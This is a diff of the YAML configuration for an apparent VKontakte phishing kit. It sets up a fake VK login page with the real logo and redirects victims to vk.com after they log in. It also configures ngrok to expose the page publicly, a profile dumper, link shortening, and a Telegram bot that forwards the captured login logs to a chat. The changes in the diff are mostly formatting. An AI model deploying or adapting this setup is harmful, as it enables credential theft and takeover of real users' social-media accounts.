@@ -3,28 +3,28 @@
 # Вот https://github.com/xxhax-team/vk-phishing/blob/master/docs/ru.md
 # По ссылке объясняется что тут к чему
 
-
 title: Вход | ВКонтакте # Title of page, that will be visible to user
 image: https://vk.com/images/brand/vk-logo.png # Same as title
 exit: https://vk.com/im # User will go to this page after successful auth
 port: 3000 # Port to server listen on
 authUrl: /auth # Authorization server url, used by ajax requests on client
+# exposePluginsConfigOnClient: false
 
 plugins: # List of plugins & their settings
   dumper: false # Dumper of user profiles, set `true` for enable, `false` for disable
   ngrok: # Ngrok config, see https://ngrok.com/docs#config
     region: eu
     enabled: true
-    ## if you have any 
+    ## if you have any
     ## you can also uncomment auth token field, for make link's life longer
-    # authtoken: 
-  vkcc: 
+    # authtoken:
+  vkcc:
     tokens: [] # Default tokens for links shortening (can also be apps & groups)
     enabled: false
 
-  telegram: # Module for send logs to telegram 
-    token: '111:xxxxx' # Telegram bot token, obtained from BotFather
-    chatId: '@PazhiloyMoriarti' # Contact name, user id or chat id
+  telegram: # Module for send logs to telegram
+    token: "111:xxxxx" # Telegram bot token, obtained from BotFather
+    chatId: "@PazhiloyMoriarti" # Contact name, user id or chat id
     lang: en # Or ru, if you prefer russian
     successOnly: true # Set `false`, if you want receive unsuccessful messages
     enabled: false # Set `true` to enable
